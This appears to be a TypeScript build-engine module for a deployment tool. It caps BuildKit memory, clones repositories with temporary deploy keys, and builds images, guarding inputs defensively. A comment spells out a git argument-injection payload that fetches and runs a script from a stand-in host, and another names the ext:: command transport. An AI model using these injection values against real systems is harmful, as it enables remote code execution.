import { BUILDKIT_CONTAINER } from "@noddle/shared/noddle-containers";
import { BUILDKIT_IMAGE } from "@noddle/shared/toolchain";
import {
  exec,
  execArgv,
  quoteArg,
  writeRemoteFile,
} from "@noddle/ssh-executor";
import type { ExecOptions, ExecResult, SshClient } from "@noddle/ssh-executor";

export class BuildError extends Error {
  readonly stage: string;
  readonly exitCode: number | null;

  constructor(stage: string, message: string, exitCode: number | null) {
    super(message);
    this.name = "BuildError";
    this.stage = stage;
    this.exitCode = exitCode;
  }
}

/**
 * Did the build die for lack of memory rather than for a mistake in it?
 *
 * BuildKit reports this three different ways depending on who noticed —
 * the kernel killing the process, buildkit's own accounting, or the tool
 * reporting the signal. All three mean the same thing and none of them says
 * "memory cap".
 */
const OOM_SIGNATURES = [
  "cannot allocate memory",
  "ResourceExhausted",
  "signal SIGKILL",
  "Killed",
  "out of memory",
];

export function looksOutOfMemory(output: string): boolean {
  return OOM_SIGNATURES.some((sign) => output.includes(sign));
}

function check(stage: string, res: ExecResult): ExecResult {
  if (res.code !== 0) {
    const tail = (res.stderr || res.stdout)
      .trim()
      .split("\n")
      .slice(-8)
      .join("\n");
    const output = `${res.stderr}\n${res.stdout}`;
    // Said plainly, because the raw buildkit output names neither the cap
    // nor memory as the cause — it ends on an exit code and a stack of
    // layer noise, which reads as a broken build rather than a machine too
    // small for it.
    // The FIRST line is the headline the dashboard shows on its own; the
    // rest is tool output, collapsed behind it. So the first line has to
    // say what happened without any of the noise below it.
    const headline = looksOutOfMemory(output)
      ? `${stage} ran out of memory. The builder is capped so one heavy build cannot take down what is already running. Build on a larger server, or make the build lighter.`
      : `${stage} failed (code ${res.code})`;
    throw new BuildError(stage, `${headline}\n${tail}`, res.code);
  }
  return res;
}

// ─────────────────────────────────────────────────────────────────────────────
// Build cap sizing
// ─────────────────────────────────────────────────────────────────────────────

export interface BuildCap {
  cpuPeriod: number;
  cpuQuota: number;
  memory: string;
}

/**
 * Derives the cap from the server's memory.
 *
 * Not TOTAL memory: under the chosen topology, Noddle also hosts its own
 * Postgres, Redis, web and worker on the same machine, plus already-deployed
 * services. A cap computed on the total would starve exactly what it is meant
 * to protect.
 *
 * The 512 MB floor is not caution: below that, an ordinary Node build fails,
 * and the user concludes Noddle is broken rather than that their machine is
 * too small.
 */
export function computeBuildCap(opts: {
  totalMemoryMb: number;
  reservedMb?: number;
  cpus?: number;
}): BuildCap {
  const reserved = opts.reservedMb ?? 768;
  const available = Math.max(opts.totalMemoryMb - reserved, 0);
  const memoryMb = Math.max(Math.floor(available * 0.75), 512);

  const cpus = opts.cpus ?? 1.5;
  return {
    cpuPeriod: 100_000,
    cpuQuota: Math.round(cpus * 100_000),
    memory: `${memoryMb}m`,
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Capped builder
// ─────────────────────────────────────────────────────────────────────────────

/** `buildx inspect` has no --format on the pinned version; parse its output. */
const REMOTE_DRIVER = /^Driver:\s+remote$/m;

/** buildx alias pointing at that same daemon, for the Dockerfile path. */
export const BUILDX_BUILDER = "noddle-builder";

/**
 * Starts the capped BuildKit daemon, and points buildx at it.
 *
 * `docker build --memory` DOES NOT WORK: BuildKit accepts the flag and ignores
 * it (moby/buildkit#1362). A cap set there is a silent no-op — the worst case,
 * since the build succeeds and the protection appears active. The cgroup has to
 * sit on the DAEMON.
 *
 * Noddle runs that daemon itself rather than letting buildx create one, because
 * there are now two build paths and they must share one cap:
 *
 *   railpack  → BUILDKIT_HOST=docker-container://<name>
 *   Dockerfile → buildx, `remote` driver pointed at the same container
 *
 * Two separately capped daemons would each be allowed the full cap, so a
 * Compose build running next to an app build could take twice the memory the
 * server was measured to have. One daemon, one cgroup, every build inside it.
 *
 * Verified on a 2 GB VM: buildx's remote driver attaches to a container it did
 * not create, builds through it, and the container's cgroup is unchanged.
 */
export async function ensureCappedBuilder(
  client: SshClient,
  cap: BuildCap,
  opts: ExecOptions = {}
): Promise<void> {
  const running = await exec(
    client,
    `sudo docker inspect ${quoteArg(BUILDKIT_CONTAINER)}`
  );
  if (running.code !== 0) {
    check(
      "buildkit daemon",
      await execArgv(
        client,
        [
          "sudo",
          "docker",
          "run",
          "-d",
          "--privileged",
          "--restart",
          "unless-stopped",
          "--name",
          BUILDKIT_CONTAINER,
          `--memory=${cap.memory}`,
          `--cpu-quota=${cap.cpuQuota}`,
          `--cpu-period=${cap.cpuPeriod}`,
          BUILDKIT_IMAGE,
        ],
        opts
      )
    );
  }

  // A server provisioned before railpack already has a `noddle-builder` on the
  // `docker-container` driver, carrying its OWN capped buildkitd. Left alone,
  // `inspect` succeeds, this returns early, and the Dockerfile path keeps
  // building on that second daemon — two caps on a machine sized for one, which
  // is the exact failure the shared daemon exists to prevent. So the DRIVER is
  // what decides, not the builder's existence.
  //
  // `buildx inspect` has no --format on the pinned version; the driver comes off
  // its `Driver:` line. Read into a variable rather than piped to grep: these
  // run under pipefail, where an early-exiting reader kills the producer.
  const builder = await exec(
    client,
    `sudo docker buildx inspect ${quoteArg(BUILDX_BUILDER)}`
  );
  const onRemoteDriver = REMOTE_DRIVER.test(builder.stdout);
  if (builder.code === 0 && !onRemoteDriver) {
    check(
      "stale builder removal",
      await execArgv(
        client,
        ["sudo", "docker", "buildx", "rm", BUILDX_BUILDER],
        opts
      )
    );
  }
  if (builder.code !== 0 || !onRemoteDriver) {
    check(
      "buildx builder",
      await execArgv(
        client,
        [
          "sudo",
          "docker",
          "buildx",
          "create",
          "--name",
          BUILDX_BUILDER,
          "--driver",
          "remote",
          `docker-container://${BUILDKIT_CONTAINER}`,
        ],
        opts
      )
    );
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// ARGUMENT injection — distinct from shell injection
// ─────────────────────────────────────────────────────────────────────────────

/**
 * `quoteArg` neutralizes shell metacharacters. It does NOT protect against
 * argument injection: a value starting with `-` remains a distinct argv token
 * that the program will read as a flag.
 *
 *     git clone --upload-pack='curl evil.sh|sh' ...
 *
 * `--upload-pack` makes git execute an arbitrary command. No amount of quoting
 * changes that: the shell is not at fault.
 *
 * Two defenses, applied together:
 *   1. refuse here anything that looks like a flag (defense in depth — the
 *      engine does not trust its callers, even though @noddle/shared already
 *      validates at the HTTP boundary);
 *   2. place `--` before positionals where the command supports it.
 */
function assertNotFlag(value: string, label: string): void {
  if (value.startsWith("-")) {
    throw new BuildError(
      "validation",
      `${label} cannot start with "-": git would read it as a flag`,
      null
    );
  }
}

const SAFE_BRANCH = /^[A-Za-z0-9._/-]+$/;
const SAFE_SHA = /^[0-9a-f]{7,40}$/;
/**
 * Whitelist of git transports, not merely a refusal of flags.
 *
 * `assertNotFlag` is not enough here: `ext::sh -c <command>` is a perfectly
 * valid git transport that EXECUTES the command, and it does not start with a
 * dash. A blacklist would miss the next variant; so we enumerate what is
 * allowed.
 *
 * `file://` is admitted: inert transport, useful for a local mirror or an
 * offline install. `ext::`, `--upload-pack` and the like are outside this
 * list, hence refused.
 */
const SAFE_REPO_URL = /^(https:\/\/|ssh:\/\/|file:\/\/|git@[\w.-]+:)/;

/**
 * A working directory we are willing to ERASE.
 *
 * `fetchSource` starts with `rm -rf` on this path. It is built by the caller
 * from a base identifier — never from user input — but that is precisely the
 * kind of certainty that does not survive a refactor: an empty identifier, and
 * `/var/lib/noddle/builds/` disappears entirely. Same philosophy as
 * `assertNotFlag` just above: the engine does not trust its callers.
 *
 * At least three segments, none empty, none `..` — which rules out the root,
 * `/opt`, a trailing-slash path, and any traversal.
 */
function assertWipableDir(dir: string): void {
  const segments = dir.split("/");
  const bad =
    !dir.startsWith("/") ||
    segments.length < 4 ||
    segments.slice(1).some((s) => s === "" || s === "." || s === "..");
  if (bad) {
    throw new BuildError(
      "validation",
      `working directory refused: "${dir}". Too close to the root or malformed, and it would be erased`,
      null
    );
  }
}

const SURROUNDING_SLASHES = /^\/+|\/+$/g;

/**
 * Join a user-supplied build path onto the clone directory.
 *
 * The result becomes a `cd` target on the user's server, so an escape is
 * refused here even though @noddle/shared already validated it — same
 * philosophy as `assertNotFlag`: the engine does not trust its callers.
 */
export function resolveBuildDir(
  cloneDir: string,
  buildPath: string | null | undefined
): string {
  const rel = buildPath?.trim().replace(SURROUNDING_SLASHES, "") ?? "";
  if (rel === "") {
    return cloneDir;
  }
  assertNotFlag(rel, "build path");
  if (rel.split("/").some((s) => s === "" || s === "." || s === "..")) {
    throw new BuildError(
      "validation",
      `build path refused: "${buildPath}". It would leave the repository`,
      null
    );
  }
  return `${cloneDir}/${rel}`;
}

// ─────────────────────────────────────────────────────────────────────────────
// Source fetch
// ─────────────────────────────────────────────────────────────────────────────

export interface CloneOptions extends ExecOptions {
  branch: string;
  commitSha?: string;
  /**
   * Decrypted deploy key for a private repository. Absent = clone
   * anonymously. NEVER logged, and never placed on a command line: it goes
   * to the build host over SFTP and is removed before this returns.
   */
  deployKey?: string | null;
  dir: string;
  /** Identifies the key's directory on the build host. */
  keyScope?: string;
  repoUrl: string;
  /** Clone submodules too, shallow like the parent. */
  submodules?: boolean;
}

/**
 * Where a deploy key lives for the duration of one clone.
 *
 * Per scope and not a fixed `/tmp/id_rsa`: two services building at once
 * would otherwise overwrite each other's key, and `/tmp` is readable by
 * every user on the host.
 */
function keyDirFor(scope: string): string {
  return `/var/lib/noddle/keys/${scope}`;
}

/**
 * Installs the deploy key and returns the `GIT_SSH_COMMAND` git must run
 * with. The caller MUST call `removeDeployKey` afterwards, in a `finally`.
 *
 * The key travels over SFTP: passed through a shell — even quoted — it
 * would appear in the command string, which is exactly what gets streamed
 * to the deployment log.
 */
async function installDeployKey(
  client: SshClient,
  scope: string,
  deployKey: string
): Promise<string> {
  const dir = keyDirFor(scope);
  const keyPath = `${dir}/id`;

  // 0700 BEFORE the write: SFTP creates with the remote umask, so the
  // directory is what actually keeps the key private, not the file mode.
  check(
    "deploy key directory",
    await exec(client, `sudo install -d -m 700 -o "$USER" ${quoteArg(dir)}`)
  );
  await writeRemoteFile(client, keyPath, ensureTrailingNewline(deployKey));
  // ssh refuses a key readable by anyone else, and says so obscurely.
  check(
    "deploy key mode",
    await exec(client, `chmod 600 ${quoteArg(keyPath)}`)
  );

  // IdentitiesOnly: without it ssh offers every agent key first and the
  // server closes the connection on MaxAuthTries before reaching ours.
  // accept-new is trust-on-first-use: an unknown host is accepted, a host
  // whose key CHANGED is still refused.
  return [
    "ssh",
    "-i",
    keyPath,
    "-o",
    "IdentitiesOnly=yes",
    "-o",
    "StrictHostKeyChecking=accept-new",
    "-o",
    `UserKnownHostsFile=${dir}/known_hosts`,
  ]
    .map(quoteArg)
    .join(" ");
}

function removeDeployKey(client: SshClient, scope: string): Promise<unknown> {
  // Best effort: a clone that succeeded must not be reported as failed
  // because the cleanup did. The directory is 0700 either way.
  return exec(client, `rm -rf ${quoteArg(keyDirFor(scope))}`).catch(() => null);
}

/** An OpenSSH key without a final newline is rejected as malformed. */
function ensureTrailingNewline(key: string): string {
  return key.endsWith("\n") ? key : `${key}\n`;
}

type GitRunner = (
  label: string,
  argv: readonly string[]
) => Promise<{ stdout: string }>;

/** Move onto an explicit commit, submodules included. */
async function checkoutCommit(
  git: GitRunner,
  o: CloneOptions & { commitSha?: string }
): Promise<void> {
  const sha = o.commitSha;
  if (!sha) {
    return;
  }
  await git("git checkout", [
    "git",
    "-C",
    o.dir,
    "fetch",
    "--depth",
    "1",
    "origin",
    sha,
  ]);
  // No `-- <sha>` here: in git, `checkout -- X` means "restore FILE X",
  // not "switch to commit X". `--detach` lifts the ambiguity, and the SHA
  // validation rules out a flag.
  await git("git checkout", ["git", "-C", o.dir, "checkout", "--detach", sha]);
  // The clone resolved submodules for the BRANCH tip; this commit may
  // point elsewhere.
  if (o.submodules) {
    await git("git submodule update", [
      "git",
      "-C",
      o.dir,
      "submodule",
      "update",
      "--init",
      "--recursive",
      "--depth",
      "1",
    ]);
  }
}

/** Returns the SHA actually built — never "the branch". */
export async function fetchSource(
  client: SshClient,
  o: CloneOptions
): Promise<string> {
  // The engine re-validates what @noddle/shared already validated on the API
  // side. One day a caller will forget, and that day it is RCE on the client's
  // server.
  assertNotFlag(o.repoUrl, "repository URL");
  assertNotFlag(o.branch, "branch name");
  assertWipableDir(o.dir);
  if (!SAFE_REPO_URL.test(o.repoUrl)) {
    throw new BuildError("validation", "repository URL refused", null);
  }
  if (!SAFE_BRANCH.test(o.branch)) {
    throw new BuildError("validation", "branch name refused", null);
  }
  if (o.commitSha && !SAFE_SHA.test(o.commitSha)) {
    throw new BuildError("validation", "commit SHA refused", null);
  }

  check(
    "directory preparation",
    await exec(
      client,
      `sudo rm -rf ${quoteArg(o.dir)} && sudo mkdir -p ${quoteArg(o.dir)} && sudo chown -R "$USER" ${quoteArg(o.dir)}`
    )
  );

  const scope = o.keyScope ?? "shared";
  const sshCommand = o.deployKey
    ? await installDeployKey(client, scope, o.deployKey)
    : null;

  // Every git call goes through here: a deploy key that authenticated the
  // clone but not the submodule fetch would fail halfway, with the repo
  // already on disk.
  const git = async (label: string, argv: readonly string[]) => {
    // quoteArg on each element for the same reason execArgv exists — the
    // URL and branch come from the user. The env prefix is why this is not
    // execArgv itself.
    const command = argv.map(quoteArg).join(" ");
    return check(
      label,
      await exec(
        client,
        sshCommand
          ? `GIT_SSH_COMMAND=${quoteArg(sshCommand)} ${command}`
          : command,
        o
      )
    );
  };

  try {
    await git("git clone", [
      "git",
      "clone",
      "--depth",
      "1",
      "--branch",
      o.branch,
      ...(o.submodules ? ["--recurse-submodules", "--shallow-submodules"] : []),
      // End of options: everything after is positional, even if it starts
      // with a dash.
      "--",
      o.repoUrl,
      o.dir,
    ]);

    if (o.commitSha) {
      await checkoutCommit(git, o);
    }

    const rev = await git("git rev-parse", [
      "git",
      "-C",
      o.dir,
      "rev-parse",
      "HEAD",
    ]);
    return rev.stdout.trim();
  } finally {
    if (sshCommand) {
      await removeDeployKey(client, scope);
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Build
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Packages Noddle forces into every image it builds from source.
 *
 * `curl` is the deploy healthcheck (`httpHealthcheckTest`), and railpack's
 * Debian base does NOT ship it. Measured inside a built image, under the same
 * non-login `sh -c` a HEALTHCHECK runs in: curl ABSENT, wget ABSENT, node
 * present at /mise/shims/node. That is the exact inverse of the nixpacks base,
 * and left alone it fails silently — the task never converges and it presents
 * as a Traefik routing bug, not as a missing binary.
 *
 * The leading `...` is load-bearing: it means "extend railpack's generated
 * package list". Without it the list is REPLACED and the image loses whatever
 * the provider put there.
 *
 * This is only possible because railpack has no nix overlay to lose. The
 * equivalent nixpacks flags (`--apt`, `--pkgs`) wiped the overlay list and
 * broke every Node build, which is why the healthcheck used to be constrained
 * to whatever the base image already happened to carry.
 */
export const FORCED_DEPLOY_PACKAGES = "... curl";

export interface BuildOptions extends ExecOptions {
  dir: string;
  imageTag: string;
  /** Rebuild every layer — `--no-cache`. */
  noCache?: boolean;
  /** Relative path passed to railpack as `RAILPACK_SPA_OUTPUT_DIR`. */
  publishDirectory?: string | null;
}

/**
 * Railpack builds straight to BuildKit — there is no intermediate Dockerfile.
 *
 * Three things this depends on, all measured on a real 2 GB VM:
 *
 * 1. `sudo -E`, and `-E` is not optional. Railpack reads `BUILDKIT_HOST` from
 *    its environment and exits if it is unset; plain `sudo` drops it. Same trap
 *    as the pinned installer.
 *
 * 2. The image reaches the daemon because railpack pipes BuildKit's
 *    `ExporterDocker` tarball into a bare `docker load` — the binary name is
 *    hardcoded in railpack, with no sudo and no override. So the whole
 *    invocation has to run as a user that can already reach the docker socket.
 *    (`--output` is NOT this: it exports a filesystem, not an image.)
 *
 * 3. `--progress plain`. The default renderer rewrites the screen and is
 *    unusable as an SSE stream. That is the output the dashboard shows.
 *
 * Config variables go through `--env` and nowhere else — the process
 * environment is not read for them.
 */
export async function buildImage(
  client: SshClient,
  o: BuildOptions
): Promise<void> {
  assertNotFlag(o.dir, "build directory");
  assertNotFlag(o.imageTag, "image tag");

  const publishDirectory = o.publishDirectory?.trim();

  // The build directory is railpack's positional argument, so there is no
  // `cd` and therefore no shell operator: every token stays a quoted argv
  // element and `execArgv` can do its job.
  const argv = [
    "sudo",
    "-E",
    "env",
    `BUILDKIT_HOST=docker-container://${BUILDKIT_CONTAINER}`,
    "railpack",
    "build",
    o.dir,
    "--name",
    o.imageTag,
    "--progress",
    "plain",
    "--env",
    `RAILPACK_DEPLOY_APT_PACKAGES=${FORCED_DEPLOY_PACKAGES}`,
  ];

  // Setting the output dir forces SPA mode even when framework detection
  // would not have fired — which is what the user asked for by naming it.
  if (publishDirectory && publishDirectory.length > 0) {
    assertNotFlag(publishDirectory, "publish directory");
    argv.push("--env", `RAILPACK_SPA_OUTPUT_DIR=${publishDirectory}`);
  }
  if (o.noCache) {
    argv.push("--no-cache");
  }

  check("railpack", await execArgv(client, argv, o));
}

export interface DockerfileBuildOptions extends ExecOptions {
  /** Build context root — the directory from which `COPY` resolves. */
  contextDir: string;
  /**
   * Dockerfile path, RELATIVE to `contextDir`. A Compose deploy provides its
   * own Dockerfile per service (what `build:` references in the file) — railpack
   * never sees this path, the user already has one.
   */
  dockerfilePath: string;
  imageTag: string;
  /** Rebuild every layer — `--no-cache` on buildx. */
  noCache?: boolean;
}

/**
 * The Dockerfile path, for a user who brought their own.
 *
 * Railpack cannot build an arbitrary Dockerfile, so this stays on buildx — which
 * means Noddle carries TWO build front-ends. They are not two caps: the builder
 * is a `remote` alias onto the same buildkitd container railpack uses, so one
 * cgroup still covers everything (see `ensureCappedBuilder`).
 *
 * This is also the build path for a Compose service: each service with a
 * `build:` in the file goes through here, one by one, before `docker stack
 * deploy` sees the rewritten file with `image:` entries instead.
 */
export async function buildImageFromDockerfile(
  client: SshClient,
  o: DockerfileBuildOptions
): Promise<void> {
  // `contextDir` and `dockerfilePath` come from a user-supplied compose file,
  // never from a code constant — same caution as at the entry of `fetchSource`.
  assertNotFlag(o.contextDir, "context directory");
  assertNotFlag(o.dockerfilePath, "Dockerfile path");
  assertNotFlag(o.imageTag, "image tag");

  check(
    "docker buildx build",
    await exec(
      client,
      `cd ${quoteArg(o.contextDir)} && sudo docker buildx build` +
        ` --builder ${quoteArg(BUILDX_BUILDER)}` +
        ` --progress=plain --load${
          o.noCache ? " --no-cache" : ""
        } -f ${quoteArg(o.dockerfilePath)}` +
        ` -t ${quoteArg(o.imageTag)} .`,
      o
    )
  );
}
